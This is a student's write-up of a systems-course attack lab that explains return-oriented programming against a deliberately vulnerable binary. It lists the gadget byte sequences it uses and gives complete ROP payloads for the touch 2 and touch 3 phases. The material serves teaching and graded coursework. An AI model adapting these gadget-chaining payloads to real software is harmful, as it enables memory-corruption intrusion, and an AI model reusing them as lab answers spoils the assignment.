**Preparation**

"rtarget" is different from "ctarget" in that it uses two ways to protect stack overflow.

The first one is stack randomization, which make the stack addresses differ from one run to another. So we cannot locate the stack addresses staticly.

The second is stack disexecutablity, which marks the section of memory holding the stack as nonexecutable. So even we could set the program counter to the start of out injected code, the program will still fail with a segmentation fault.

Therefore, we need a new technique called "Return Oriented Programming".

This technique is to identify byte segments in the target program that do specific instructions and followed by ```ret(c3)```. Those segments are called "gadgets". Combine those gadgets to from a chain and put them in the ```ret``` zone and the program will execute each gadget in order.

Hint: The instruction ```nop``` is an empty instruction with byte ```0x90```, which can be ignored in gadgets.

**Touch 2**

The original injected code should be like below.

```assembly
ci.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret
```

However, we cannot find such byte segment in rtarget, so we have to change our realization with the help of registers. Because the code above is related to immediate values. 

Then we could only store the cookie ```0x59b997fa``` to a register, using the assembly code

```assembly
0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	c3                   	ret
```

with the cookie in the stack right above.

Then pass the value to ```%rdi``` and jump to the address of "touch 2" ```0x4017ec```. With the assembly code

```assembly
0000000000000000 <.text>:
   0:	48 89 c7             	mov    %rax,%rdi
   3:	c3                   	ret
```

At last, seek for the byte segment ```58 c3``` and ```48 89 c7 c3``` in "rtarget.d".

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret
```

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret
```

So the exploit can be

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```



**Touch 3**

Since the stack is randomized, we cannot store cookie string in an absolute address. We can only store it access the cookie memory according to ```%rsp```.

One primitive assembly code is like below, with all ```ret``` line muted.

```assembly
movq    %rsp, %rdi
popq    %rax    # offset is stored above
leaq    (%rdi,%rax), %rdi
```

However, there is no corresponding byte segments. So we can only change a little bit, which acts like a puzzle hunting game.

Finally, the lines can be below.

```assembly
ci.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 89 e0             	mov    %rsp,%rax
   3:	48 89 c7             	mov    %rax,%rdi
   6:	58                   	pop    %rax
   7:	89 c2                	mov    %eax,%edx
   9:	89 d1                	mov    %edx,%ecx
   b:	89 ce                	mov    %ecx,%esi
   d:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  11:	48 89 c7             	mov    %rax,%rdi
```

The offset is ```0x48```. Find all the addresses in "rtarget.d", and the exploit can be

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
63 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```